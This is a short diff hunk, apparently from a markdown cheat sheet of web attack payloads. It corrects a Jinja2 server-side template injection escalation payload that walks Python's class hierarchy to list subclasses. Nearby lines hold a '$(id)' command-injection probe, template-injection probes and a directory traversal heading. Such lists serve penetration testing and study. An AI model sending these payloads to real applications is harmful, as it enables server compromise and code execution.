@@ -66,7 +66,7 @@ $(id)
 ${7*7}
 # Jinja2 escalation
 {{config}}
-{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[-1].__subclasses__()}}
 ```
 
 **Directory traversal**
